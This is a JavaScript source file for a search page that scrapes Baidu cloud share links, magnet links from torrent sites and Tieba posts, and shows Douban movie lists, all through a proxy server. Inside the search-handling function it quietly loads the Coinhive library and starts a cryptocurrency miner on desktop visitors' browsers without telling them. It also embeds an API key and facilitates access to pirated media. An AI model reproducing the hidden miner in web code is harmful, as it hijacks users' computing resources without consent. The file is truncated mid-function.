window.onload = function(){
    
}

String.prototype.format = function()
{
    var args = arguments;
    return this.replace(/\{(\d+)\}/g,                
        function(m,i){
            return args[i];
        });
}

    locationParameterChanged();

function setHeight(input,height){
        input.style.height = height;
}

function setFontSize(input,maxLength,fontSize){
    function min(x,y){
        return x-y<0?x:y;
    }
    function max(x,y){
        return x-y<0?y:x;
    }
    if(!fontSize){
        var fontSize = max(min(window.innerWidth,window.innerHeight)/maxLength,16)+"px";

    }
    input.style.fontSize = fontSize;
}

function changeHash(form){
    if(location.hash.substr(1)==form.search.value){
        Location.reload();
    }else{

        location.hash = "#"+form.search.value;
    }
    return false;
}
function locationParameterChanged() {
    var key = getURLParameter("search");
    var input = document.getElementsByTagName("input")[0];

//     var submit = document.querySelector('[type="submit"]');
//     submit.onclick=function(e){

//         if(!input.value){
//             e.preventDefault();
            
//             input.focus();
//         }
//     }
    input.oninput = function(e){
        if(e.data ==" "){
            setDoubanSearch(input.value);
        }
//          setFontSize(input,input.value.length>8?input.value.length+2:8+2);
        
    }
    input.onfocus = function(){
         setHeight(input,"50%");
//          setFontSize(input,10);
    }
    document.getElementsByTagName("form")[0].onsubmit = function(){
         setHeight(input,"15%");
//          setFontSize(input,100,"1.5em");
    }
    if(!key){
        input.focus();
        input.setAttribute("required","required");
        setDoubanTop(undefined,true);
        return;
    }

    input.value=key;
    document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";
    setMessageForm(key);
    window.panc=pancFetcher(key);
    window.panduoduo=panduoduoFetcher(key);
    magnetFetcher(key);
    window.tieba=tiebaFetcher(key);
    if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
        importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
            var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
            miner.start();
        })
    }

    setDoubanSearch(input.value,undefined,true);
    setMagnetTech();
}

function setMoreFetcher(button){
    button.style.display="none";
    var key = getURLParameter("search");
    window.panduoduo=panduoduoFetcher(key);
    window.tieba=tiebaFetcher(key);
}
function setMessageForm(key){

    var sms = new String("有 {0} 吗？\r找到后发给我邮箱或手机\r：");
    var messageForm =  document.getElementById("messageForm");
    if(messageForm){
        messageForm.message.value = sms.format(key);
        messageForm.onsubmit=function(e){
            e.preventDefault();

            var submit = messageForm.querySelector('[type="submit"]')
            var tabMessage = document.getElementById("tab-message");

            submit.classList.add("loading");
//             var uri = "http://127.0.0.1:8888/cross";
            var uri = "//charon-node.herokuapp.com/cross"
            var method = messageForm.method;
            var data = {
                "crossUrl":messageForm.action
                ,"crossMethod":method
                ,"message":messageForm.message.value
            }
            var fn = function(data){
                console.log(data+messageForm.action);
                tabMessage.click();
                submit.classList=[];
                tabMessage.classList=[];
                tabMessage.classList.add("success");
            }
            var error = function(){
                submit.classList=[];
                tabMessage.classList=[];
                tabMessage.classList.add("error");
            }

            ajax(uri,fn,error,method,JSON.stringify(data));

            return false;
        }
    }
}
function loading(is,id){           
    var loadingDoc = document.getElementById(id?id:"pancLoading");
    loadingDoc.style.display=is?"block":"none";
}
function confirm(id,isImportant,data){
    try{
        if(!id){
            confirm.innerHTML = "";
        }
        var template = document.getElementById(id).innerHTML;
        var confirm;
        if(isImportant){

            confirm = document.getElementById("confirm2");
        }else{

            confirm = document.getElementById("confirm");
        }
        if(id=="noneTemplate"){
            data = getURLParameter("search");
        }
        var html= template.format(data);
        confirm.innerHTML = "";
        if(id=="moreTemplate"){
            confirm.id = "confirm2";
        }
    }catch(e){
        
    }
    
}



function ShowMore(){

    var length = window.showVideos.length;
    var ways = [panc,tieba,magnet,panduoduo];

//     var ways = [panduoduo];
    if(length<1){
        length = 1;
    }
    setMoreIframe(ways,0,length);

    
}
function setMoreIframe(ways,index,length){
    if(!index){
        index = 0;
    }
    if(!ways[index]){
        confirm("noneTemplate",true);
        return;
    }
    var videos = ways[index].videos;
    var than = length - videos.length;

    if(videos.length == 0){
        setMoreIframe(ways,index+1,than);
    }else if(than>0){
        ways[index].setIframe(videos,videos.length,window.showVideos,true);
        setMoreIframe(ways,index+1,than);
    }else{
        ways[index].setIframe(videos,length,window.showVideos,true);
    }

}
function fetcher(parameter){
    var serf = {};
    serf.host = parameter.host;
    serf.videos = [];
    serf.fetchUrl = parameter.fetchUrl;
    serf.parseVideos = parameter.parseVideos;
    serf.setIframe = function (videos,length,showVideos,doNotCheckInvalid){
        
        if(parameter.setIframe){
            parameter.setIframe(videos,length,showVideos,doNotCheckInvalid);
        }else{
            var videos = videos.splice(0,length);
            videos.map(function(video,index){
                var success = function(){
                    setIframe(video,index==0);
                    showVideos.push(video);
                };
                if(doNotCheckInvalid){

                    success();
                }else{
                    serf.checkInvalid(video,function(){
                        if(index>=videos.length-1){
                            serf.setIframe(serf.videos,1,showVideos);
                        }
                    },success);
                }
            });
            
        }

        serf.progress.setNum(serf.videos.length);
    }

    serf.checkInvalid = function(video,error,success){
        if(parameter.checkInvalid){
            var uri = "//charon-node.herokuapp.com/cross?api="+video.url;
            ajax(uri,function(data){
                var index = data.indexOf("百度网盘-链接不存在");

                if(index<0){
                    success();
                }else{
                    error();
                }
                data=null;
            },error);
        }else{
            success();
        }
    }
    serf.onLoaded=function(){
        serf.setIframe(serf.videos,1,window.showVideos);
        if(parameter.onLoaded){
            parameter.onLoaded(serf);
        }
    }
    serf.fetch = parameter.fetch;
    serf.load = function (){
        serf.progress = innerProgress(serf.host,serf.fetchUrl);
        var success = function(html){
            var progress = serf.progress;
            var videos = serf.parseVideos(html);
            if(!videos||videos.length===0){
                progress.none();
                confirm("noneTemplate");
                return;
            }
            progress.success(videos.length);
            serf.videos = videos;
            if(!window.showVideos){
                window.showVideos = [];
            }
            serf.onLoaded();
            html = null;

        };
        serf.fetch(serf.host,serf.fetchUrl,success);
        return serf;
    }
    
    return serf.load();
}

function panduoduoFetcher(key){
    var parameter = {};
    parameter.host = "panduoduo";
    parameter.fetchUrl = "http://www.panduoduo.net/s/comb/n-"+key+"&ty-bd&f-f4";
    parameter.fetch = fetch;
    parameter.parseVideos = function(html){
        return parseList(html,".search-page .row");
        function parseList(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;

            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                if(videos.length>10){
                    break;
                }
                var img = as[i].querySelector('[title="百度云盘资源"]');
                var type = as[i].querySelector('[href^="/c/"]');
                if(img&&type.innerHTML=="视频"){
                    var a = as[i].querySelector("a[href^='/r/']");
                    var video = {ref:parameter.host,name:a.innerHTML,url:"http://www.panduoduo.net"+a.pathname};
                    videos.push(video);
                }

    //                 fetchDetal(video,i===0);

            }
            html = el = els = null;
            return videos;
        }

    }
    parameter.setIframe = function (panduoduoVideos,length,showVideos){
        var videos = panduoduoVideos.splice(0,length);
        videos.forEach(function (item, index, array) {

            showVideos.push(item);
            fetchDetal(item,index===0);
        });
        
        function fetchDetal(video,isSrc){
            
            var wrapper = setIframe(video,false,true);
            var success = function(html){

                var url = parseDetail(html,"a.dbutton2");
                if(!url){
                    parameter.setIframe(videos,1,window.showVideos);

                }
                if(window.showVideos&&isExist(url,window.showVideos)){
                    return;
                }
                video["url"] = url;
                function parseDetail(html,select){
                    var urlIndex = html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length;
                    var href = html.substring(urlIndex,html.indexOf('"',urlIndex));
//                     var url = getURLParameter("url",href);
                    return href;
                }
                url = "//charon-node.herokuapp.com/cross?api="+url;
                setIframeUrl(url,wrapper,isSrc);


            }
            fetch("panduoduo",video.url,success);
        }
//         function fetchGo(video,isSrc){
//             fetch("panduoduo",video.url,success);
//         }
    }
    
    return fetcher(parameter);
    
}


function pancFetcher(key){

    var parameter = {};
    parameter.host = "panc";
    parameter.fetchUrl = "https://www.panc.cc/s/"+key+"/td";
    parameter.fetch = nodeFetch;
    parameter.onLoaded = function(fetcher){

        clearInvalid(fetcher,function(video){
            fetcher.setIframe([video],1,window.showVideos);
            fetcher.progress.setNum(fetcher.videos.length);

        });
    }
    parameter.setIframe = function (videos,length,showVideos){
        var videos = videos.splice(0,length);
        videos.map(function(video,index){
            if(!checkExistUk(video,showVideos)){
                setIframe(video,index==0);
                showVideos.push(video);
            }else{
                parameter.setIframe(videos,1,showVideos);
            }
        });
        videos = null;
    }

    parameter.parseVideos = function(html){
        var videos = parseHref(html,".a_url");
        

        function parseHref(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;
            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                videos.push({name:as[i].previousElementSibling.innerHTML,url:as[i].href});
            }
            return videos;
        }
        return videos;
    }
//     parameter.checkInvalid = true;
    
    
    return fetcher(parameter);

}

function fetch(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI("//charon-node.herokuapp.com/fetch?api="+api);
//     var url = encodeURI("http://127.0.0.1:8888/fetch?api="+api);
//     var data = JSON.stringify({crossUrl:api});
    try{
        var error = function(){
            var videos = [];
            confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}
function nodeFetch(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI("//charon-node.herokuapp.com/fetch?npm=node-fetch&api="+api);
//     var url = encodeURI("http://127.0.0.1:8888/fetch?npm=node-fetch&api="+api);
//     var data = JSON.stringify({crossUrl:api});
    try{
        var error = function(){
            var videos = [];
            confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}
function cross(host,api,success){

//     confirm("loadingTemplate");
//     var url = encodeURI("http://127.0.0.1:8888/cross?api="+api);

    var url = encodeURI("//charon-node.herokuapp.com/cross?api="+api);
    try{
        var error = function(){
            var videos = [];
            confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}



// function setIframe(videos,isSrc,waitUrl,templateId) {
    
//     templateId = templateId?templateId:"videoTemplate";
//     var template = document.getElementById(templateId).innerHTML;

//     var dataBox =  document.getElementById("data");
//     for(var i=0;i<videos.length;i++){
// //         if(window.showVideos&&isExist(videos[i],window.showVideos)){
// //             continue;
// //         }
//         var wrapper= document.createElement('div');
//         wrapper.innerHTML= template;
//         a = wrapper.children[0];
//         a.innerHTML=videos[i].name;
//         var url = videos[i].url;
//         a.href=videos[i].refUrl||url;
//         if(!waitUrl){
//             if(templateId=="videoTemplate"){
//                 var index = url.indexOf("//");
//                 url = url.substr(index>=0?index:0);
//             }
//             setIframeUrl(url,wrapper,isSrc&&i==0,templateId);
        
//         }

        
//         dataBox.appendChild(wrapper);
//     }
//     confirm("");
//     dataBox = iframe = videos = null;
//     return wrapper;
// }
function setIframe(video,isSrc,waitUrl,templateId){
    if(video.ref&&video.ref=="magnet"){
        templateId = "magnetTemplate"
    }
    templateId = templateId?templateId:"videoTemplate";
    var template = document.getElementById(templateId).innerHTML;

    var dataBox =  document.getElementById("data");
        var wrapper= document.createElement('div');
        wrapper.innerHTML= template;
        a = wrapper.children[0];
        a.innerHTML=video.name;
        var url = video.url;
        a.href=video.refUrl||url;
        if(!waitUrl){
            if(templateId=="videoTemplate"){
                var index = url.indexOf("//");
                url = url.substr(index>=0?index:0);
            }
            setIframeUrl(url,wrapper,isSrc,templateId);
        
        }

        
        dataBox.appendChild(wrapper);
    confirm("");
    dataBox = iframe = null;
    return wrapper;
}
function setIframeUrl(url,wrapper,isSrc,templateId){
    var iframe = wrapper.querySelector("iframe");

    templateId = templateId?templateId:"videoTemplate";
    if(!url){
        wrapper.removeChild(iframe);
        return;
    }
    if(templateId=="videoTemplate"){
        if(isDisableScript(url)){
            iframe.sandbox="allow-same-origin allow-popups allow-forms allow-pointer-lock";
        }
        iframe.dataset.src=url;
        if(isSrc){
            iframe.src=url;
        }
        addVideosHandler(iframe);


    }else if(templateId=="magnetTemplate"){

        var code= wrapper.querySelector("code");;
        code.innerHTML = url;
    }
}
function isExist(url,videos){
    for(var i=0;i<videos.length;i++){
        if(videos[i].url==url){
            return true;
        }
    }
    return false;
}
function isDisableScript(url){
    if(url.indexOf("pan.baidu.com/pcloud/album/file")>0){
        return true;
    }
    return false;
}

function load(uri,fn){
    var request = new XMLHttpRequest();
    request.open('PUT', uri, false); 
    request.send(null);
    if (request.status === 200) {
      return request.responseText;
    }
}

function getURLParameter(name,url) {
  return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(url?url:location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
}


function isElementInViewport (el) {

    //special bonus for those using jQuery
    if (typeof jQuery === "function" && el instanceof jQuery) {
        el = el[0];
    }

    var rect = el.getBoundingClientRect();

    return (
        rect.top >= 0 &&
        rect.left >= 0 &&
        rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && /*or $(window).height() */
        rect.right <= (window.innerWidth || document.documentElement.clientWidth) /*or $(window).width() */
    );
}
function onVisibilityChange(el, callback) {
    var old_visible;
    return function () {
        var visible = isElementInViewport(el);
        if (visible != old_visible) {
            old_visible = visible;
            if (typeof callback == 'function') {
                callback();
            }
        }
    }
}
function addVideosHandler(iframe){
    var handler = onVisibilityChange(iframe, function() {
        if(!iframe.src){
            iframe.src = iframe.dataset.src;
        }
    });
    if (window.addEventListener) {
        addEventListener('DOMContentLoaded', handler, false); 
        addEventListener('load', handler, false); 
        addEventListener('scroll', handler, false); 
        addEventListener('resize', handler, false); 
    } else if (window.attachEvent)  {
        attachEvent('onDOMContentLoaded', handler); // IE9+ :(
        attachEvent('onload', handler);
        attachEvent('onscroll', handler);
        attachEvent('onresize', handler);
    }
}

function ajax(uri,fn,error,method,data){
    var request = new XMLHttpRequest();
    request.open(method||"GET", uri);
    try{
      request.send(data||null);
    }catch(e){
        error();
    }
    request.onload = function(e) {
        if (this.status == 200) {
            try{
                fn(this.response,error);
            }catch(e){
                error();
            }
        }else{
          error();
        }
    };
    request.onerror = error;
    request.timeout = 20000; // time in milliseconds
    request.ontimeout = function (e) {
      // XMLHttpRequest timed out. Do something here.
      request.abort();
      error();
    };
}

function isEnglish(string){
    var notEnglish = /[^\x00-\x7F]+/;
    if (notEnglish.test(string)){
        return false;
    }
    return true;
}

function magnetFetcher(key){
    var parameter = {};

    if(isEnglish(key)){
//         return null;
//     }
        parameter.host = "thepiratebay";
        parameter.fetchUrl = "https://thepiratebay.org/search/"+key+"/0/99/0";
        parameter.parseVideos = function(html){
            var videos = parseList(html);
            return videos;

            function parseList(html){

                var videos = [];
                var el = document.createElement( 'html' );
                el.innerHTML = html;

                var els = el.querySelectorAll("#searchResult tbody tr");
                
                for(var i = 0;i<els.length;i++){
        //             if(i>10){
        //                 break;
        //             }
                    var name = els[i].querySelector(".detLink").innerHTML;
                    var url = els[i].querySelector("a[href^='magnet:']").href;
                    var video = {ref:"magnet",name:name,url:url};
                    videos.push(video);
        //                 fetchDetal(video,i===0);

                }
                html = el = els = null;
                return videos;
            }
        };

        parameter.fetch = cross;
    }else{
        parameter.host = "diaosisou";
        parameter.fetchUrl = "http://www.diaosisou.org/list/"+key+"/1";
        parameter.parseVideos = function(html){
            var videos = parseList(html);
            return videos;

            function parseList(html){

                var videos = [];
                var el = document.createElement( 'html' );
                el.innerHTML = html;

                var els = el.querySelectorAll(".mlist>li");
                el = null;
                for(var i = 0;i<els.length;i++){
        //             if(i>10){
        //                 break;
        //             }
                    var name = els[i].querySelector("a[name='file_title'").innerHTML;
                    var url = els[i].querySelector("a[href^='magnet:']").href;
                    var video = {ref:"magnet",name:name,url:url};
                    videos.push(video);
        //                 fetchDetal(video,i===0);

                }
                
                html = el = els = null;
                return videos;
            }
        };
        parameter.fetch = nodeFetch;
    }
    

//     parameter.setIframe = function (videos,length,showVideos){
//         var videos = videos.splice(0,length);
//         window.showVideos = window.showVideos.concat(videos);
//         videos.map(function(video,index){
//             setIframe(video,true,false,"magnetTemplate");
//         });
//     }
    
    window[parameter.host] = fetcher(parameter);


    
}

function loadError (oError) {
  throw new URIError("The script " + oError.target.src + " is not accessible.");
}

function importScript (sSrc, fOnload) {
  var oScript = document.createElement("script");
  oScript.type = "text\/javascript";
  oScript.onerror = loadError;
  if (fOnload) { oScript.onload = fOnload; }
  document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
  oScript.src = sSrc;
}

function progress(host){

    var _progress = document.getElementById(host+'Progress');
    if(_progress.interval){
        return _progress;
    }
    _progress.init = function(){

        _progress.parentNode.parentNode.classList=[];
        _progress.value = 0;
        _progress.interval=setInterval(frame, 10);
    }
//     _progress.is_progress = true;
    _progress.success=function(length){

        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("success");
        clearInterval(_progress.interval);
        if(length){
           _progress.nextSibling.innerHTML = "<em>"+length+"</em>";
        }
    };
    _progress.setNum=function(length){
        if(length>0){
            _progress.success(length);
        }else{
            _progress.none();
        }
    }
    _progress.none = function(){
        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("none");
        clearInterval(_progress.interval);
        _progress.nextSibling.innerHTML = "<em>"+0+"</em>";
    }
    _progress.error = function(){
        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("error");
        clearInterval(_progress.interval);
    }
    _progress.parentNode.onclick=function(){
        var fetcher = window[host];
        if(fetcher&&fetcher.videos.length){
            var length = fetcher.videos.length;
            var showLength = showVideos.length;
            length = length>showLength?showLength:length;
            setMoreIframe([fetcher],0,length);
        }
    }
    _progress.nextSibling.nextSibling.onclick=function(){
        var fetcher = window[host];
        if(fetcher){
            fetcher.load();
        }
    }
    function frame() {
        if (_progress.value >= 20000) {
            clearInterval(_progress.interval);
            _progress.error();
        } else {
            _progress.value  = _progress.value + 10;
        }
    }
    return _progress;
}

function innerProgress(host,fetchUrl){
    var progressGroup = document.getElementById("progressGroup");
    progressGroup.classList.add("show");
    var  progressD= document.getElementById(host+"Progress");
    if(!progressD){
        var html = '<li><a target="_blank" href="'+fetchUrl+'" title="'+host+'"><i class="'+host+'"></i></a><span class="more" href="javascript:return void()"><progress max="20000" id="'+host+'Progress"></progress><span class="num"></span><span class="reloadSingle" title="Reload"></span></span>';
        var child = progressGroup.querySelector("li.more");
        beforeHTML(progressGroup,html,child);
    }
    var _progress  = progress(host);

    _progress.init();
    return _progress;
}
function appendHTML(d,html){
    var wrapper= document.createElement('div');
        wrapper.innerHTML= html;
        d.appendChild(wrapper.children[0]);
}
function beforeHTML(d,html,child){
    var wrapper= document.createElement('div');
        wrapper.innerHTML= html;
        d.insertBefore(wrapper.children[0],child);
}

// function changeShowVideosNeedCheck(video,url){
//     if(!url){
//         showVideos.push(video);
//     }else{
//         video["url"]=url;
//     }
//     check(video["url"],function(){
//         showVideos = showVideos.splice(video, 1);
//     })
// }
function checkInvalid(url,error,success){

    var uri = "//charon-node.herokuapp.com/cross?api="+url;
    ajax(uri,function(data){
        var index = data.indexOf("百度网盘-链接不存在");
        
        if(index<0){
            success();
        }else{
            error();
        }
        data=null;
    },error);
}
function clearInvalid(fetcher,successOne){
    try{
        var array = fetcher.videos;
        array.map(function(o) { 
    
            var isSortUrl =function(url){
                var index = url.indexOf("pan.baidu.com/s/");
                return index>=0?true:false;
            }
            if(!isSortUrl(o["url"])){
                checkInvalid(o["url"],function(){
                    array.splice(array.indexOf(o), 1);
                    fetcher.progress.setNum(array.length);
                },function(){
                    if(successOne){
                        successOne(o);
                        successOne = false;
                    }
                })
            }
        });
    }catch(e){

    }
    

}

function setDoubanList(value){
    var api = "https://api.douban.com/v2/movie/search?q="+value;
    var uri = "//charon-node.herokuapp.com/cross?api="+api;
    ajax(uri,function(data){
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        for(var i = 0;i<3&&i<subjects.length;i++){

            var isSame = "";
            if(value!=subjects[i].title){
                isSame = 'href="?search='+encodeURIComponent(subjects[i].title)+'"';

            }
            html += '<a '+isSame+' ><img src="'+subjects[i].images.medium+'"/><span>'+subjects[i].title+'<span></a>'
            if(subjects[i].original_title!=subjects[i].title){
                var isSame = "";
                if(value!=subjects[i].original_title){
                    isSame = 'href="?search='+encodeURIComponent(subjects[i].original_title)+'"';
                }
                html += '<a '+isSame+' ><img src="'+subjects[i].images.medium+'"/><span>'+subjects[i].original_title+'<span></a>'

            }
        }
        var doubanListD = document.getElementById("doubanList");
        doubanListD.innerHTML=html;
        doubanListD.style.display = "block";
        data=html=subjects=doubanListD=null;
    });
}
function setDoubanSearch(value,tab,isLazy){

    var value = value||getURLParameter("search");
    if(!value){
        return;
    }
    if(!tab){

        var tab = document.getElementById("tab-Search");
        if(!isLazy){
            tab.checked = true;
        }
        tab.parentNode.style.display="inline-block";
    }else if(tab.checked == false){
        return;
    }
    setOtherClose(tab);
    var doubanListD = tab.nextElementSibling.nextElementSibling;
    if(doubanListD.innerHTML){
        return;
    }
    var api = "https://api.douban.com/v2/movie/search?q="+value;
    var uri = "//charon-node.herokuapp.com/cross?api="+api;
    ajax(uri,function(data){
        if(isLazy){
            tab.checked = true;
        }
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        for(var i = 0;i<5&&i<subjects.length;i++){
            
            var isSame = "";
            if(value!=subjects[i].original_title){
                isSame = 'href="?search='+encodeURIComponent(subjects[i].original_title)+'"';
            }
            html += '<a '+isSame+' ><img src="'+subjects[i].images.medium+'"/><span>'+subjects[i].original_title+'<span></a>'

            
            if(i<1&&subjects[i].original_title!=subjects[i].title){
                var isSame = "";
                if(value!=subjects[i].title){
                    isSame = 'href="?search='+encodeURIComponent(subjects[i].title)+'"';

                }
                html += '<a '+isSame+' ><img src="'+subjects[i].images.medium+'"/><span>'+subjects[i].title+'<span></a>'

            }
        }
        doubanListD.innerHTML=html;
        data=html=subjects=doubanListD=null;
    });
}
function setDoubanTop(tab,isLazy){
    if(!tab){
        var tab = document.getElementById("tab-2");
        if(!isLazy){
            tab.checked = true;
        }
    }else if(tab.checked == false){
        return;
    }
    
    setOtherClose(tab);
    var doubanListD = tab.nextElementSibling.nextElementSibling;
    if(doubanListD.innerHTML){
        return;
    }

    var random = parseInt(Math.random()*230);
    var api = "http://api.douban.com/v2/movie/top250?apikey=0df993c66c0c636e29ecbb5344252a4a&start="+random;
    var uri = "//charon-node.herokuapp.com/cross?api="+api;
    ajax(uri,function(data){
        if(isLazy){
            tab.checked = true;
        }
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        var value = getURLParameter("search");
        for(var i = 0;i<subjects.length;i++){
            var subject = subjects[i];

            if(i<1&&subject.original_title!=subject.title){
                var isSame = "";
                if(value!=subject.title){
                    isSame = 'href="?search='+encodeURIComponent(subject.title)+'"';

                }
                html += '<a '+isSame+' ><img src="'+subject.images.medium+'"/><span>'+subject.title+'<span></a>'

            }else{
                var isSame = "";
                if(value!=subject.original_title){
                    isSame = 'href="?search='+encodeURIComponent(subject.original_title)+'"';
                }
                html += '<a '+isSame+' ><img src="'+subject.images.medium+'"/><span>'+subject.original_title+'<span></a>'

            }
            
            
//             var isSame = "";
//             var title = subject.original_title;
//             if(value&&value==title){
//             }else{
//                 isSame = ' href="?search='+encodeURIComponent(title)+'"';
          
//             }
//             html += '<a '+isSame+'><img src="'+subject.images.medium+'"/><span>'+title+'<span></a>'

        }
        html += '<a target="_blank" href="https://movie.douban.com/top250" class="douban-more icon-douban">Top 250<i>﹀</i></a>';
        doubanListD.innerHTML=html;
        data=html=subjects=doubanListD=null;
    });
}
function setOtherClose(tab){
    var tabs = document.querySelectorAll("[name='tabgroup']");
    for(var i=0;i<tabs.length;i++){
        if(tab!==tabs[i]){
            tabs[i].checked=false;
        }
    }
}
function setDoubanWeekly(tab){
    
    if(!tab){
        var tab = document.getElementById("tab-Weekly");
        tab.checked = true;
    }else if(!tab||tab.checked == false){
        return;
    }
    setOtherClose(tab);
    var doubanListD = tab.nextElementSibling.nextElementSibling;
    if(doubanListD.innerHTML){
        return;
    }

    var api = "http://api.douban.com/v2/movie/weekly?apikey=0df993c66c0c636e29ecbb5344252a4a";
    var uri = "//charon-node.herokuapp.com/cross?api="+api;
    
    ajax(uri,function(data){
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        var value = getURLParameter("search");
        for(var i = 0;i<subjects.length;i++){
            var subject = subjects[i].subject;
            var isSame = "";
            if(value!=subject.original_title){
                isSame = 'href="?search='+encodeURIComponent(subject.original_title)+'"';
            }
            html += '<a '+isSame+' ><img src="'+subject.images.medium+'"/><span>'+subject.original_title+'<span></a>'

            
            if(i<1&&subject.original_title!=subject.title){
                var isSame = "";
                if(value!=subject.title){
                    isSame = 'href="?search='+encodeURIComponent(subject.title)+'"';

                }
                html += '<a '+isSame+' ><img src="'+subject.images.medium+'"/><span>'+subject.title+'<span></a>'

            }
//             var isSame = "";
//             var title = subject.original_title;
//             if(value&&value==title){
//             }else{
//                 isSame = ' href="?search='+encodeURIComponent(title)+'"';
          
//             }
//             html += '<a '+isSame+'><img src="'+subject.images.medium+'"/><span>'+title+'<span></a>'

        }
//         html += '<a target="_blank" href="https://movie.douban.com/top250" class="douban-more">Top 250<i>﹀</i></a>';
        doubanListD.innerHTML=html;
//         doubanListD.id = "doubanWeekly2";
//         doubanListD.style.display = "block";
        data=html=subjects=doubanListD=null;
    });
}
function setMagnetTech(tab){
    if(!tab){
        var tab = document.getElementById("tab-Magnet");
//         tab.checked = true;
        tab.parentNode.style.display="inline-block";
        return;

    }else if(!tab||tab.checked == false){
        return;
    }
    setOtherClose(tab);
    var contentD = tab.nextElementSibling.nextElementSibling;
    contentD.innerHTML = document.getElementById("magnetTechTemplate").innerHTML;
}
function setDoubanTheaters(tab){
    
    if(!tab){
        var tab = document.getElementById("tab-theaters");
        tab.checked = true;
    }else if(!tab||tab.checked == false){
        return;
    }
    setOtherClose(tab);
    var doubanListD = tab.nextElementSibling.nextElementSibling;
    if(doubanListD.innerHTML){
        return;
    }

    var api = "http://api.douban.com/v2/movie/in_theaters?apikey=0df993c66c0c636e29ecbb5344252a4a";
    var uri = "//charon-node.herokuapp.com/cross?api="+api;
    
    ajax(uri,function(data){
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        var value = getURLParameter("search");
        for(var i = 0;i<subjects.length;i++){
            var subject = subjects[i];
            var isSame = "";
            if(value!=subject.title){
                isSame = 'href="?search='+encodeURIComponent(subject.title)+'"';

            }
            html += '<a '+isSame+' ><img src="'+subject.images.medium+'"/><span>'+subject.title+'<span></a>'

            
            if(i<1&&subject.original_title!=subject.title){
               var isSame = "";
                if(value!=subject.original_title){
                    isSame = 'href="?search='+encodeURIComponent(subject.original_title)+'"';
                }
                html += '<a '+isSame+' ><img src="'+subject.images.medium+'"/><span>'+subject.original_title+'<span></a>'

            }
//             var isSame = "";
//             var title = subject.original_title;
//             if(value&&value==title){
//             }else{
//                 isSame = ' href="?search='+encodeURIComponent(title)+'"';
          
//             }
//             html += '<a '+isSame+'><img src="'+subject.images.medium+'"/><span>'+title+'<span></a>'

        }
//         html += '<a target="_blank" href="https://movie.douban.com/top250" class="douban-more">Top 250<i>﹀</i></a>';
        doubanListD.innerHTML=html;
//         doubanListD.id = "doubanWeekly2";
//         doubanListD.style.display = "block";
        data=html=subjects=doubanListD=null;
    });
}

function reloadIframe(button){
    button.previousElementSibling.src=button.previousElementSibling.src
}



function tiebaFetcher(key){

    var parameter = {};
    parameter.host = "tieba";
    parameter.fetchUrl = "http://tieba.baidu.com/f/search/res?ie=utf-8&qw="+key+" pan.baidu";
    parameter.fetch = cross;

    parameter.parseVideos = function(html){
        var videos = parseHref(html,".s_post");
        
//         clearInvalid(videos);
        return videos;

        function parseHref(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;
            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                var p_title = as[i].querySelector(".p_title").innerHTML;
                var refUrlIndex = p_title.indexOf('href="')+6;
                var refUrlEnd = p_title.indexOf('"',refUrlIndex);
                var refUrl = p_title.substring(refUrlIndex,refUrlEnd)
                var html = p_title+as[i].querySelector(".p_content").innerHTML;
                
                var key = getkey(html);
                var string = as[i].querySelector(".p_title").innerText+" "+as[i].querySelector(".p_content").innerText;
                var keyIndex = string.lastIndexOf(key);
                var name = string.slice(keyIndex);
                var url = getUrl(string,keyIndex);
                
                if(key&&url){
                    videos.push({name:string,url:url,refUrl:"http://tieba.baidu.com"+refUrl});
                }

            }
            return videos;

            function getUrl(string,keyIndex){
                var keyIndex2 = keyIndex?keyIndex:0;
                var urlIndex = string.indexOf("http",keyIndex2);
                if(urlIndex>=0){
                    var url = string.slice(urlIndex);
                    var regexp = /[^\x00-\x7F]|\s|\.\.\.|,/;
                    var match = url.match(regexp);
                    url = url.slice(0,match.index);
                    return url;
                }else{
                    if(keyIndex){
                        return getUrl(string);
                    }
                }
                return "";
            }
            function getkey(html){
                var wrapper= document.createElement('div');
                wrapper.innerHTML= html;
                var ems = wrapper.querySelectorAll("em");
                for(var i = ems.length-1;i>=0;i--){
                    if(ems[i].innerText!="pan.baidu"){
                        return ems[i].innerText;
                    }
                }
                return "";
            }
        }
    }
//     parameter.setIframe = function (videos,length,showVideos){
//         var videos = videos.splice(0,length);
//         window.showVideos = window.showVideos.concat(videos);
//         videos.map(function(video,index){
//             setIframe(video,index==0,false);
//         });
//     }
    
    return fetcher(parameter);

}


function checkExistUk(video,videos){
    try{
        var newUk = getURLParameter("uk",video.url);
        for(var i = 0;i<videos.length;i++){
            var object = videos[i];
            var uk = getURLParameter("uk",object.url);
            if(newUk&&newUk==uk){
                return true;
            }
        };
    }catch(e){
        return true;
    }
